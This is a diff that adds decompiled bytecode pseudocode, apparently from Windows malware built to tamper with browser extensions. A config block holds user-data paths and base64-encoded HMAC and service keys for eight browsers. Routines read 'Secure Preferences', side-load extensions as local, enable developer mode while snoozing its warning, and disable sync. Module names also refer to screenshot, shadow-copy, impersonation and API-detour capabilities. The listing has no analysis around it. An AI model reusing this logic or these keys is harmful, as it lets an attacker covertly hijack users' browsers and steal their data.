+					{
+						ACCU = r18["extensions"]["settings"]
+					}
+					r5 = ACCU
+					if (!ACCU == undefined)
+					{
+						r18 = Generator(ToObject(ACCU))
+						r22 = 0
+						while (true)
+						{
+							if (!GeneratorContinue(r22)) break
+							if (r18.next().value == undefined) continue
+							r3 = r18.next().value
+							r7 = r18.next().value
+							try
+							{
+								r24 = r5[r7]
+								r8 = r24["path"]
+								if (!r24["path"])
+								{
+									continue
+								}
+								r24 = Scope[1994][22]["isAbsolute"]
+								ACCU = r24(r8)
+								if (r24(r8))
+								{
+									ACCU = r8
+								}
+								else
+								{
+									r24 = Scope[1994][22]["join"]
+									r26 = "Extensions"
+									r25 = a0
+									r27 = r8
+									ACCU = r24(r25, r26, r27)
+								}
+								r9 = ACCU
+								r24 = Scope[1994][22]["join"]
+								r10 = r24(r9, "..")
+								r25 = Scope[1994][24]["readExtensionBackupMetadata"](r10)
+								r24 = r25["catch"]
+								r25 = r24(func_createId_0x10000add6)
+								r24 = r0
+								r24 = _AsyncGeneratorAwaitCaught(r24, r25)
+								r25 = _GeneratorGetResumeMode(r0)
+								if (!r25 === 0)
+								{
+									ACCU = r24
+								}
+								r11 = r24["id"]
+								r24 = new {"id": null, "originalId": null, "securePreferences": null}
+								r24["id"] = r7
+								r24["originalId"] = r11
+								r24["securePreferences"] = a1
+								r25 = r24
+								r24 = r0
+								r24 = _AsyncGeneratorYield(r24, r25, true)
+								switch (_GeneratorGetResumeMode(r0))
+								default:
+								{
+									ACCU = r24
+								}
+								case (1):
+								{
+									r13 = 1
+									r14 = r24
+									break
+								}
+								case (0):
+								{}
+								ACCU = r24
+								continue
+							}
+							catch {}
+							ACCU = null
+							ACCU = Scope[2000]
+							r22 = GeneratorStep(r22)
+						}
+					}
+				}
+				catch
+				{
+					ACCU = null
+					ACCU = Scope[2000]
+				}
+				r14 = undefined
+				ACCU = 1
+				r13 = 1
+			}
+			catch
+			{
+				r17 = ACCU
+				ACCU = null
+				ACCU = Scope[2001]
+				r14 = _AsyncGeneratorReject(r0, Scope[2001][2])
+				r13 = 2
+			}
+		}
+		catch
+		{
+			r14 = ACCU
+			r13 = 0
+		}
+	}
+	ACCU = _GeneratorClose(r0)
+	ACCU = null
+	switch (r13)
+	default:
+	{
+		break
+	}
+	case (0):
+	{
+		ACCU = r14
+	}
+	case (1):
+	{
+		return _AsyncGeneratorResolve(r0, r14, true)
+	}
+	case (2):
+	{
+		return r14
+	}
+	return undefined
+}
+function func_openExtension_0x10000add4(a0, a1, a2)
+{
+	r2 = Scope[1994][23]["openLocalStorage"]
+	r5 = ("chrome-extension://" + a1)
+	return r2(a0, a2, r5)
+}
+function func_open_0x10000add2(a0, a1, a2, a3)
+{
+	r5 = <closure>
+	r6 = <this>
+	ACCU = func_te_0x10000add1
+	try
+	{
+		r1 = func_joinSettings_0x10000ade0(a0, a1, a2)
+		r6 = Scope[1994][20]["default"]
+		ACCU = Scope[1994][20]["default"]
+		r2 = r6(r1, a3)
+		r6 = r2["open"]
+		r7 = r6()
+		r6 = await r7
+		r7 = _GeneratorGetResumeMode(Scope[2003])
+		if (!r7 === 0)
+		{
+			ACCU = r6
+		}
+		r7 = r2
+		ACCU = r7
+		return r7
+	}
+	catch {}
+	r6 = ACCU
+	ACCU = null
+	ACCU = Scope[2004]
+	return Scope[2004][2]
+}
+function func_restoreExtension_0x10000add0(a0)
+{
+	r10 = <closure>
+	r11 = <this>
+	r7 = ACCU
+	try
+	{
+		r0 = a0["extensionId"]
+		r1 = a0["profile"]
+		r2 = a0["securePreferences"]
+		r3 = a0["domainSid"]
+		r4 = a0["settingsKey"]
+		r5 = a0["snoozeDevModeWarning"]
+		r6 = a0["hmacKey"]
+	}
+	catch
+	{
+		r11 = ACCU
+		ACCU = null
+		ACCU = Scope[2005]
+		r12 = r7
+		return Scope[2005][2]
+	}
+	ACCU = func_K_0x10000adcf
+	try
+	{
+		r12 = Scope[1994][24]["restoreExtension"]
+		r13 = r12(r0, r1, r2, r3, r4, r5, r6)
+		r12 = r7
+		r12 = await r13
+		r13 = _GeneratorGetResumeMode(r7)
+		if (!r13 === 0)
+		{
+			ACCU = r12
+		}
+		r9 = r12
+		r13 = func_syncSettings_0x10000add9(r1, r0, r9)
+		r12 = r7
+		r12 = await r13
+		r13 = _GeneratorGetResumeMode(r7)
+		if (!r13 === 0)
+		{
+			ACCU = r12
+		}
+		r13 = undefined
+		r12 = r7
+		ACCU = r13
+		return r13
+	}
+	catch {}
+	r12 = ACCU
+	ACCU = null
+	ACCU = Scope[2007]
+	r13 = r7
+	return Scope[2007][2]
+}
+function func_installExtension_0x10000adce(a0, a1, a2)
+{
+	r12 = <closure>
+	r13 = <this>
+	r0 = ACCU
+	ACCU = func_H_0x10000adcd
+	try
+	{
+		if (!a2)
+		{
+			r13 = Scope[1994][22]["join"]
+			r15 = Scope[1994][21]["randomUUID"]
+			r15 = r15()
+			r11 = r13(a0["profile"], r15)
+			r13 = Scope[1994][26]["createDir"]
+			r14 = r13(r11)
+			r13 = r0
+			r13 = await r14
+			r14 = _GeneratorGetResumeMode(r0)
+			if (!r14 === 0)
+			{
+				ACCU = r13
+			}
+			ACCU = r13
+			try
+			{
+				r17 = a0
+				r19 = r11
+				r15 = func_installExtension_0x10000adce(r17, a1, r19)
+				r14 = r0
+				r14 = await r15
+				r15 = _GeneratorGetResumeMode(r0)
+				if (!r15 === 0)
+				{
+					ACCU = r14
+				}
+				r15 = r14
+				r14 = r0
+				ACCU = r15
+				return r15
+			}
+			catch {}
+			r14 = ACCU
+			ACCU = null
+			ACCU = Scope[2008]
+			r16 = Scope[1994][26]["remove"](r11)
+			r15 = r0
+			r15 = await r16
+			r16 = _GeneratorGetResumeMode(r0)
+			if (!r16 === 0)
+			{
+				ACCU = r15
+			}
+			ACCU = Scope[2008][2]
+		}
+		r13 = Scope[1994][24]["makeExtensionLocal"]
+		r16 = a2
+		r14 = r13(a0["extensionId"], a0["profile"], r16, a0["securePreferences"], a0["domainSid"], a0["settingsKey"], a0["snoozeDevModeWarning"], a0["hmacKey"])
+		r13 = r0
+		r13 = await r14
+		r14 = _GeneratorGetResumeMode(r0)
+		if (!r14 === 0)
+		{
+			ACCU = r13
+		}
+		r9 = r13["id"]
+		ACCU = r13["path"]
+		r10 = r13["path"]
+		try
+		{
+			r15 = func_syncSettings_0x10000add9(a0["profile"], a0["extensionId"], r9)
+			r14 = r0
+			r14 = await r15
+			r15 = _GeneratorGetResumeMode(r0)
+			if (!r15 === 0)
+			{
+				ACCU = r14
+			}
+			r16 = a1
+			r15 = r16(r10, a0["extensionId"])
+			r14 = r0
+			r14 = await r15
+			r15 = _GeneratorGetResumeMode(r0)
+			if (!r15 === 0)
+			{
+				ACCU = r14
+			}
+			r15 = r14
+			r14 = r0
+			ACCU = r15
+			return r15
+		}
+		catch {}
+		r14 = ACCU
+		ACCU = null
+		ACCU = Scope[2009]
+		r15 = Scope[1994][24]["restoreExtension"]
+		r16 = r15(r9, a0["profile"], a0["securePreferences"], a0["domainSid"], a0["settingsKey"], a0["snoozeDevModeWarning"], a0["hmacKey"])
+		r15 = r0
+		r15 = await r16
+		r16 = _GeneratorGetResumeMode(r0)
+		if (!r16 === 0)
+		{
+			ACCU = r15
+		}
+		ACCU = Scope[2009][2]
+	}
+	catch {}
+	r13 = ACCU
+	ACCU = null
+	ACCU = Scope[2010]
+	r14 = r0
+	return Scope[2010][2]
+}
+function func_loadPreferences_0x10000adcc(a0)
+{
+	r2 = <closure>
+	r3 = <this>
+	r0 = _CreateJSGeneratorObject(<closure>, <this>)
+	ACCU = func_N_0x10000adcb
+	try
+	{
+		try
+		{
+			r6 = r0
+			ACCU = _GeneratorGetResumeMode(r0)
+			switch (_GeneratorGetResumeMode(r0))
+			default:
+			{
+				ACCU = r6
+			}
+			case (1):
+			{
+				ACCU = 1
+				r2 = 1
+				r3 = r6
+				break
+			}
+			case (0):
+			{
+				r14 = "Preferences"
+				r13 = a0
+				r11 = func_loadExtensions_0x10000add7(r13, r14)
+				ACCU = r11[Symbol.asyncIterator]
+				if (!r11[Symbol.asyncIterator] == undefined)
+				{
+					ACCU = r11[Symbol.asyncIterator]()
+				}
+				r8 = ACCU
+				r10 = r8["next"]
+				r9 = undefined
+				r7 = 0
+				while (true)
+				{
+					ACCU = r7
+					switch (r7)
+					default:
+					{
+						ACCU = r10(r9)
+						break
+					}
+					case (1):
+					{
+						if (!r8["return"] == undefined)
+						{
+							ACCU = r8["return"](r9)
+							break
+						}
+						r11 = r0
+						r12 = r9
+						r11 = _AsyncGeneratorAwaitUncaught(r11, r12)
+						r12 = _GeneratorGetResumeMode(r0)
+						if (!r12 === 0)
+						{
+							ACCU = r11
+						}
+						ACCU = 1
+						r2 = 1
+						r3 = r11
+						break
+					}
+					case (2):
+					{
+						if (!r8["throw"] == undefined)
+						{
+							ACCU = r8["throw"](r9)
+							break
+						}
+						if (!r8["return"] == undefined)
+						{
+							r14 = r8["return"]()
+							r13 = r0
+							r13 = _AsyncGeneratorAwaitUncaught(r13, r14)
+							r14 = _GeneratorGetResumeMode(r0)
+							if (!r14 === 0)
+							{
+								ACCU = r13
+							}
+							ACCU = r13
+						}
+						ACCU = ThrowThrowMethodMissing(r0)
+					}
+					r14 = ACCU
+					r13 = r0
+					r13 = _AsyncGeneratorAwaitUncaught(r13, r14)
+					r14 = _GeneratorGetResumeMode(r0)
+					if (!r14 === 0)
+					{
+						ACCU = r13
+					}
+					ACCU = r13
+					r6 = r13
+					if (r6["done"]) break
+					r15 = r0
+					r9 = _AsyncGeneratorYield(r15, r6["value"], false)
+					r7 = _GeneratorGetResumeMode(r0)
+				}
+				if (r7 === 1)
+				{
+					r2 = 1
+					r3 = r6["value"]
+					break
+				}
+				r14 = "Secure Preferences"
+				r13 = a0
+				r11 = func_loadExtensions_0x10000add7(r13, r14)
+				ACCU = r11[Symbol.asyncIterator]
+				if (!r11[Symbol.asyncIterator] == undefined)
+				{
+					ACCU = r11[Symbol.asyncIterator]()
+				}
+				r8 = ACCU
+				r10 = r8["next"]
+				r9 = undefined
+				r7 = 0
+				while (true)
+				{
+					ACCU = r7
+					switch (r7)
+					default:
+					{
+						ACCU = r10(r9)
+						break
+					}
+					case (1):
+					{
+						if (!r8["return"] == undefined)
+						{
+							ACCU = r8["return"](r9)
+							break
+						}
+						r11 = r0
+						r12 = r9
+						r11 = _AsyncGeneratorAwaitUncaught(r11, r12)
+						r12 = _GeneratorGetResumeMode(r0)
+						if (!r12 === 0)
+						{
+							ACCU = r11
+						}
+						ACCU = 1
+						r2 = 1
+						r3 = r11
+						break
+					}
+					case (2):
+					{
+						if (!r8["throw"] == undefined)
+						{
+							ACCU = r8["throw"](r9)
+							break
+						}
+						if (!r8["return"] == undefined)
+						{
+							r14 = r8["return"]()
+							r13 = r0
+							r13 = _AsyncGeneratorAwaitUncaught(r13, r14)
+							r14 = _GeneratorGetResumeMode(r0)
+							if (!r14 === 0)
+							{
+								ACCU = r13
+							}
+							ACCU = r13
+						}
+						ACCU = ThrowThrowMethodMissing(r0)
+					}
+					r14 = ACCU
+					r13 = r0
+					r13 = _AsyncGeneratorAwaitUncaught(r13, r14)
+					r14 = _GeneratorGetResumeMode(r0)
+					if (!r14 === 0)
+					{
+						ACCU = r13
+					}
+					ACCU = r13
+					r6 = r13
+					if (r6["done"]) break
+					r15 = r0
+					r9 = _AsyncGeneratorYield(r15, r6["value"], false)
+					r7 = _GeneratorGetResumeMode(r0)
+				}
+				if (r7 === 1)
+				{
+					r2 = 1
+					r3 = r6["value"]
+					break
+				}
+				r3 = undefined
+				ACCU = 1
+				r2 = 1
+			}
+			catch
+			{
+				r6 = ACCU
+				ACCU = null
+				ACCU = Scope[2011]
+				r3 = _AsyncGeneratorReject(r0, Scope[2011][2])
+				r2 = 2
+			}
+		}
+		catch
+		{
+			r3 = ACCU
+			r2 = 0
+		}
+	}
+	ACCU = _GeneratorClose(r0)
+	ACCU = null
+	switch (r2)
+	default:
+	{
+		break
+	}
+	case (0):
+	{
+		ACCU = r3
+	}
+	case (1):
+	{
+		return _AsyncGeneratorResolve(r0, r3, true)
+	}
+	case (2):
+	{
+		return r3
+	}
+	return undefined
+}
+function func_initExtension_0x10000adca(a0)
+{
+	Scope[2012][23] = func_I_0x10000ad9a
+	Scope[2012][35] = func_ReadJson_0x10000ada0
+	Scope[2012][36] = func_writeJson_0x10000ada2
+	Scope[2012][37] = func_preferences_0x10000ada6
+	Scope[2012][38] = func_replaceExtensions_0x10000ada8
+	Scope[2012][39] = func_removeSync_0x10000adab
+	Scope[2012][40] = func_enableDeveloper_0x10000adad
+	Scope[2012][41] = func_Mac_0x10000adaf
+	Scope[2012][42] = func_hashHex_0x10000adb2
+	ACCU = a0
+	if (a0)
+	{
+		ACCU = a0["__importDefault"]
+	}
+	if (!ACCU)
+	{
+		ACCU = func_interopDefault_0x10000adc9
+	}
+	r1 = ACCU
+	r6 = Object["defineProperty"]
+	r9 = "__esModule"
+	r10 = new {"value": <true}
+	ACCU = r6(a0, r9, r10)
+	a0["makeExtensionLocal"] = func_installExtensionPack_0x10000ad9c
+	a0["restoreExtension"] = func_installExtension_0x10000ad9e
+	a0["readExtensionBackupMetadata"] = func_ReadJson_0x10000ada0
+	a0["writeExtensionBackupMetadata"] = func_writeJson_0x10000ada2
+	r9 = func_browserConfig_0x10000a9ad["exports"]()
+	r2 = r1(r9)
+	Scope[2012][24] = func_initMac_0x10000ab94["exports"]()
+	Scope[2012][25] = func_exportArrayReplace_0x10000ab9a["exports"]()
+	Scope[2012][26] = func_json_0x10000ab8a["exports"]()
+	Scope[2012][27] = func_fsExports_0x10000a9c5["exports"]()
+	Scope[2012][28] = func_initSha256_0x10000ab9e["exports"]()
+	Scope[2012][29] = func_time_0x10000ad93["exports"]()
+	Scope[2012][30] = func_export_0x10000ad99["exports"]()
+	Scope[2012][31] = require("path")
+	r6 = r2["default"]["extensions"]
+	r6 = r6["backup"]
+	Scope[2012][32] = r6["metadataFile"]
+	Scope[2012][33] = r6["targetDir"]
+	Scope[2012][34] = r6["originalDir"]
+	return undefined
+}
+function func_json_0x10000ab8a(a0)
+{
+	Scope[2114][13] = func_h_0x10000ab7a
+	Scope[2114][14] = func_stringify_0x10000ab7d
+	Scope[2114][15] = func_pruneEmpty_0x10000ab7f
+	ACCU = a0
+	if (a0)
+	{
+		ACCU = a0["__importDefault"]
+	}
+	if (!ACCU)
+	{
+		ACCU = func_interop_0x10000ab89
+	}
+	r1 = ACCU
+	r5 = Object["defineProperty"]
+	r8 = "__esModule"
+	r9 = new {"value": <true}
+	ACCU = r5(a0, r8, r9)
+	a0["readJSON"] = func_readJson_0x10000ab77
+	a0["writeJSON"] = func_writeJson_0x10000ab79
+	a0["stringify"] = func_stringify_0x10000ab7d
+	a0["removeEmpty"] = func_pruneEmpty_0x10000ab7f
+	r8 = func_initStringify_0x10000ab75["exports"]()
+	Scope[2114][11] = r1(r8)
+	Scope[2114][12] = require("fs/promises")
+	return undefined
+}
+function func_initStorage_0x10000aa13(a0)
+{
+	Scope[2176][9] = func_x_0x10000aa0c
+	ACCU = a0
+	if (a0)
+	{
+		ACCU = a0["__importDefault"]
+	}
+	if (!ACCU)
+	{
+		ACCU = func_unwrapModule_0x10000aa12
+	}
+	r1 = ACCU
+	r4 = Object["defineProperty"]
+	r7 = "__esModule"
+	r8 = new {"value": <true}
+	ACCU = r4(a0, r7, r8)
+	a0["openLocalStorage"] = func_OpenStore_0x10000aa0e
+	r7 = func_initStore_0x10000aa0b["exports"]()
+	Scope[2176][7] = r1(r7)
+	Scope[2176][8] = require("path")
+	return undefined
+}
+function func_initDatabase_0x10000a9e4(a0)
+{
+	Scope[2190][9] = func_A_0x10000a9d8
+	ACCU = a0
+	if (a0)
+	{
+		ACCU = a0["__importDefault"]
+	}
+	if (!ACCU)
+	{
+		ACCU = func_interopDefault_0x10000a9dc
+	}
+	r2 = ACCU
+	r6 = Object["defineProperty"]
+	r9 = "__esModule"
+	r10 = new {"value": <true}
+	ACCU = r6(a0, r9, r10)
+	r9 = func_Leveldown_0x10000a9d7["exports"]()
+	r3 = r2(r9)
+	r9 = r3["default"]
+	ACCU = ToName("get")
+	ACCU = ToName("keys")
+	ACCU = ToName("dump")
+	r7 = DefineClass([9, <DescriptorArray[4], <NumberDictionary[7], [], <NameDictionary[29], <NumberDictionary[16], [12, 20, 28]], func_construct_0x10000a9dd, r9, 53403, func_getJson_0x10000a9df, "C0qY", func_collectKeys_0x10000a9e1, "p[w*", func_readDatabase_0x10000a9e3)
+	a0["default"] = func_construct_0x10000a9dd
+	return undefined
+}
+function func_fsExports_0x10000a9c5(a0)
+{
+	Scope[2206][14] = func_E_0x10000a9b2
+	Scope[2206][17] = func_remove_0x10000a9b4
+	Scope[2206][18] = func_remove_0x10000a9ba
+	Scope[2206][19] = func_checkAccess_0x10000a9be
+	Scope[2206][20] = func_unlink_0x10000a9c0
+	r4 = Object["defineProperty"]
+	r7 = "__esModule"
+	r8 = new {"value": <true}
+	ACCU = r4(a0, r7, r8)
+	a0["createDir"] = func_remove_0x10000a9b4
+	a0["copy"] = func_movePath_0x10000a9b6
+	a0["move"] = func_renamePath_0x10000a9b8
+	a0["remove"] = func_remove_0x10000a9ba
+	a0["exists"] = func_checkAccess_0x10000a9be
+	Scope[2206][15] = require("fs/promises")
+	Scope[2206][16] = require("path")
+	return undefined
+}
+function func_exportKeys_0x10000a9b1(a0)
+{
+	Scope[2215][5] = func_n_0x10000a9ae
+	r4 = Object["defineProperty"]
+	r7 = "__esModule"
+	r8 = new {"value": <true}
+	ACCU = r4(a0, r7, r8)
+	a0["keys"] = func_keys_0x10000a9b0
+	return undefined
+}
+function func_keys_0x10000a9b0(a0)
+{
+	r1 = Object["keys"]
+	return r1(a0)
+}
+function func_browserConfig_0x10000a9ad(a0)
+{
+	Scope[2216][6] = func_o_0x10000a9a7
+	r4 = Object["defineProperty"]
+	r7 = "__esModule"
+	r8 = new {"value": <true}
+	ACCU = r4(a0, r7, r8)
+	r1 = require("path")
+	r5 = "default"
+	r6 = new {"browsers": null, "extensions": null}
+	r7 = new {"CHROME_BROWSER": null, "EDGE_BROWSER": null, "BRAVE_BROWSER": null, "OPERA_BROWSER": null, "OPERA_GX_BROWSER": null, "AVAST_BROWSER": null, "VIVALDI_BROWSER": null, "COCCOC_BROWSER": null}
+	r8 = new {"executable": null, "userData": null, "hmacKey": null, "serviceKeys": null, "msi": null}
+	r8["executable"] = "chrome.exe"
+	r9 = r1["join"]
+	r8["userData"] = r9("AppData", "Local", "Google", "Chrome", "User Data")
+	r8["hmacKey"] = func_base64Decode_0x10000a9a9("50jzNthepfnc3yXY80emW0zfZnYA8C32ckoq8YohLSa3iKJQhpEM86kDE2locfPcBYI3MMkd+LpcT9nIhLUFqA==")
+	r9 = new {"v1": null, "v2": null, "v3": null}
+	r9["v1"] = func_base64Decode_0x10000a9a9("sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=")
+	r9["v2"] = func_base64Decode_0x10000a9a9("6Y831/Th+kM9GTBNwiWAQgkOLR1+6nZw1B9zjQhylmA=")
+	r10 = new {"name": null, "value": null}
+	r10["name"] = "Google Chromekey1"
+	r10["value"] = func_base64Decode_0x10000a9a9("zPihzsVmBbhRdVK6Gi0GHAOinpAnT7L89Zukt1w5I5A=")
+	r9["v3"] = r10
+	r8["serviceKeys"] = r9
+	r9 = new {"name": null, "publisher": null}
+	r9["name"] = "Google Chrome"
+	r9["publisher"] = "Google LLC"
+	r8["msi"] = r9
+	r7["CHROME_BROWSER"] = r8
+	r8 = new {"executable": null, "userData": null, "msi": null, "launch": null, "extensions": {"snoozeDevModeWarning": <true}}
+	r8["executable"] = "msedge.exe"
+	r9 = r1["join"]
+	r8["userData"] = r9("AppData", "Local", "Microsoft", "Edge", "User Data")
+	r9 = new {"name": null, "publisher": null}
+	r9["name"] = "Microsoft Edge"
+	r9["publisher"] = "Microsoft Corporation"
+	r8["msi"] = r9
+	r9 = new {"args": null}
+	r11 = new [0]
+	r11[0] = "--allow-run-as-system"
+	r9["args"] = r11
+	r8["launch"] = r9
+	r7["EDGE_BROWSER"] = r8
+	r8 = new {"executable": null, "userData": null, "msi": null}
+	r8["executable"] = "brave.exe"
+	r9 = r1["join"]
+	r8["userData"] = r9("AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data")
+	r9 = new {"name": null, "publisher": null}
+	r9["name"] = "Brave"
+	r9["publisher"] = "Brave Software Inc"
+	r8["msi"] = r9
+	r7["BRAVE_BROWSER"] = r8
+	r8 = new {"executable": null, "userData": null, "msi": null, "extensions": null}
+	r8["executable"] = "opera.exe"
+	r9 = r1["join"]
+	r8["userData"] = r9("AppData", "Roaming", "Opera Software", "Opera Stable")
+	r9 = new {"name": null, "publisher": null}
+	r9["name"] = "Opera Stable"
+	r9["publisher"] = "Opera Software"
+	r8["msi"] = r9
+	r9 = new {"settingsKey": null}
+	r9["settingsKey"] = "opsettings"
+	r8["extensions"] = r9
+	r7["OPERA_BROWSER"] = r8
+	r8 = new {"executable": null, "userData": null, "msi": null, "extensions": null}
+	r8["executable"] = "opera.exe"
+	r9 = r1["join"]
+	r8["userData"] = r9("AppData", "Roaming", "Opera Software", "Opera GX Stable")
+	r9 = new {"name": null, "publisher": null}
+	r9["name"] = "Opera GX Stable"
+	r9["publisher"] = "Opera Software"
+	r8["msi"] = r9
+	r9 = new {"settingsKey": null}
+	r9["settingsKey"] = "opsettings"
+	r8["extensions"] = r9
+	r7["OPERA_GX_BROWSER"] = r8
+	r8 = new {"executable": null, "userData": null, "msi": null}
+	r8["executable"] = "AvastBrowser.exe"
+	r9 = r1["join"]
+	r8["userData"] = r9("AppData", "Local", "Avast Software", "Browser", "User Data")
+	r9 = new {"name": null, "publisher": null}
+	r9["name"] = "Avast Secure Browser"
+	r9["publisher"] = "Gen Digital Inc."
+	r8["msi"] = r9
+	r7["AVAST_BROWSER"] = r8
+	r8 = new {"executable": null, "userData": null, "msi": null}
+	r8["executable"] = "vivaldi.exe"
+	r9 = r1["join"]
+	r8["userData"] = r9("AppData", "Local", "Vivaldi", "User Data")
+	r9 = new {"name": null, "publisher": null}
+	r9["name"] = "Vivaldi"
+	r9["publisher"] = "Vivaldi Technologies AS."
+	r8["msi"] = r9
+	r7["VIVALDI_BROWSER"] = r8
+	r8 = new {"executable": null, "userData": null, "msi": null}
+	r8["executable"] = "browser.exe"
+	r9 = r1["join"]
+	r8["userData"] = r9("AppData", "Local", "CocCoc", "Browser", "User Data")
+	r9 = new {"name": null, "publisher": null}
+	r9["name"] = "Cốc C\\u1ed1c"
+	r9["publisher"] = "Công ty TNHH Cốc Cốc"
+	r8["msi"] = r9
+	r7["COCCOC_BROWSER"] = r8
+	r6["browsers"] = r7
+	r7 = new {"backup": null}
+	r8 = new {"metadataFile": null, "targetDir": null, "originalDir": null}
+	r8["metadataFile"] = "metadata.json"
+	r8["targetDir"] = "target"
+	r8["originalDir"] = "original"
+	r7["backup"] = r8
+	r6["extensions"] = r7
+	a0[r5] = r6
+	return undefined
+}
+function func_base64Decode_0x10000a9a9(a0)
+{
+	r1 = Buffer["from"]
+	return r1(a0, "base64")
+}
+function func_initModule_0x1000054f8(a0)
+{
+	Scope[6551][21] = func_S_0x1000054c9
+	ACCU = a0
+	if (a0)
+	{
+		ACCU = a0["__createBinding"]
+	}
+	if (!ACCU)
+	{
+		ACCU = Object["create"]
+		if (Object["create"])
+		{
+			ACCU = func_defineGetter_0x1000054db
+		}
+		else
+		{
+			ACCU = func_copyProp_0x1000054dd
+		}
+	}
+	Scope[6551][19] = ACCU
+	ACCU = a0
+	if (a0)
+	{
+		ACCU = a0["__setModuleDefault"]
+	}
+	if (!ACCU)
+	{
+		ACCU = Object["create"]
+		if (Object["create"])
+		{
+			ACCU = func_defineDefault_0x1000054df
+		}
+		else
+		{
+			ACCU = func_setDefault_0x1000054e1
+		}
+	}
+	Scope[6551][20] = ACCU
+	ACCU = a0
+	if (a0)
+	{
+		ACCU = a0["__importStar"]
+	}
+	if (!ACCU)
+	{
+		ACCU = func_interop_0x1000054f5()
+	}
+	r1 = ACCU
+	ACCU = a0
+	if (a0)
+	{
+		ACCU = a0["__exportStar"]
+	}
+	if (!ACCU)
+	{
+		ACCU = func_copyProps_0x1000054f7
+	}
+	r2 = ACCU
+	r6 = Object["defineProperty"]
+	r9 = "__esModule"
+	r10 = new {"value": <true}
+	ACCU = r6(a0, r9, r10)
+	r3 = require("worker_threads")
+	r9 = func_initExports_0x100004fb6["exports"]()
+	r4 = r1(r9)
+	if (r3["isMainThread"])
+	{
+		try
+		{
+			r7 = r4["setDPIAwareness"]
+			r9 = "PER_MONITOR"
+			ACCU = r7(r9)
+		}
+		catch
+		{
+			ACCU = null
+			ACCU = Scope[6551]
+		}
+		ACCU = r4["initializeDetours"]()
+		ACCU = r4["initializeGDI"]()
+	}
+	r9 = func_initExports_0x100004fcc["exports"]()
+	ACCU = r2(r9, a0)
+	r9 = func_exportStar_0x1000054c8["exports"]()
+	ACCU = r2(r9, a0)
+	a0["default"] = r4
+	return undefined
+}
+function func_copyProps_0x1000054f7(a0, a1)
+{
+	if (!a0 == undefined)
+	{
+		r3 = Generator(ToObject(a0))
+		r7 = 0
+		while (true)
+		{
+			if (!GeneratorContinue(r7)) break
+			if (r3.next().value == undefined) continue
+			r2 = r3.next().value
+			r1 = r3.next().value
+			r11 = "default"
+			if (r2 === r11) continue
+			r9 = Object["prototype"]
+			r9 = r9["hasOwnProperty"]
+			r8 = r9["call"]
+			if (!!Boolean(r8(a1, r1))) continue
+			r11 = a1
+			r12 = a0
+			r13 = r1
+			ACCU = Scope[6551][19](r11, r12, r13)
+			r7 = GeneratorStep(r7)
+		}
+	}
+	return undefined
+}
+function func_interop_0x1000054f5()
+{
+	Scope[6552][11] = func_Q_0x1000054e2
+	r1 = new {"qMRIq": null, "NQfjQ": null, "ATTbx": null, "hEzKD": null, "tLqCp": null, "jEaem": null, "QcFrm": null}
+	Scope[6552][12] = r1
+	Scope[6552][13] = func_Names_0x1000054f2
+	return func_interop_0x1000054f4
+}
+function func_setDefault_0x1000054e1(a0, a1)
+{
+	a0["default"] = a1
+	return undefined
+}
+function func_defineDefault_0x1000054df(a0, a1)
+{
+	r1 = Object["defineProperty"]
+	r4 = "default"
+	r5 = new {"enumerable": <true, "value": null}
+	r5["value"] = a1
+	ACCU = r1(a0, r4, r5)
+	return undefined
+}
+function func_copyProp_0x1000054dd(a0, a1, a2, a3)
+{
+	if (a3 === undefined)
+	{
+		a3 = a2
+		ACCU = a3
+	}
+	a0[a3] = a1[a2]
+	return undefined
+}
+function func_defineGetter_0x1000054db(a0, a1, a2, a3)
+{
+	Scope[6559][3] = a1
+	Scope[6559][2] = a2
+	if (a3 === undefined)
+	{
+		a3 = Scope[6559][2]
+	}
+	r3 = Object["getOwnPropertyDescriptor"]
+	r0 = r3(Scope[6559][3], Scope[6559][2])
+	ACCU = !Boolean(r3(Scope[6559][3], Scope[6559][2]))
+	if (!!Boolean(r3(Scope[6559][3], Scope[6559][2])))
+	{
+		r5 = "get"
+		ACCU = r5 in r0
+		if (r5 in r0)
+		{
+			ACCU = !Boolean(Scope[6559][3]["__esModule"])
+		}
+		else
+		{
+			if (!r0["writable"])
+			{
+				ACCU = r0["configurable"]
+			}
+		}
+	}
+	if (ACCU)
+	{
+		r3 = new {"enumerable": <true, "get": null}
+		r3["get"] = func_currentValue_0x1000054da
+		r0 = r3
+		ACCU = r3
+	}
+	r3 = Object["defineProperty"]
+	ACCU = r3(a0, a3, r0)
+	return undefined
+}
+function func_exportStar_0x1000054c8(a0)
+{
+	Scope[6560][9] = func_c_0x1000054b1
+	ACCU = a0
+	if (a0)
+	{
+		ACCU = a0["__createBinding"]
+	}
+	if (!ACCU)
+	{
+		ACCU = Object["create"]
+		if (Object["create"])
+		{
+			ACCU = func_defineExport_0x1000054c3
+		}
+		else
+		{
+			ACCU = func_copyProp_0x1000054c5
+		}
+	}
+	Scope[6560][10] = ACCU
+	ACCU = a0
+	if (a0)
+	{
+		ACCU = a0["__exportStar"]
+	}
+	if (!ACCU)
+	{
+		ACCU = func_CopyProps_0x1000054c7
+	}
+	r1 = ACCU
+	r3 = Object["defineProperty"]
+	r6 = "__esModule"
+	r7 = new {"value": <true}
+	ACCU = r3(a0, r6, r7)
+	r6 = func_initIcons_0x100004fd5["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_wakeExports_0x100004fdd["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_process_0x100004ff6["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_screenshot_0x100004ffc["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_session_0x10000500a["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_windowModule_0x10000501d["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_registry_0x100004edc["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_serviceModule_0x100005032["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_initRegistry_0x10000503f["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_powerModule_0x100005045["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_shadowCopy_0x10000510b["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_impersonation_0x100005124["exports"]()
+	ACCU = r1(r6, a0)
+	r6 = func_cryptoInit_0x1000054b0["exports"]()
+	ACCU = r1(r6, a0)
+	return undefined
+}
+function func_initExports_0x100004fcc(a0)
+{
+	Scope[6804][8] = func_c_0x100004fb9
+	ACCU = a0
+	if (a0)
+	{
+		ACCU = a0["__createBinding"]
+	}
+	if (!ACCU)
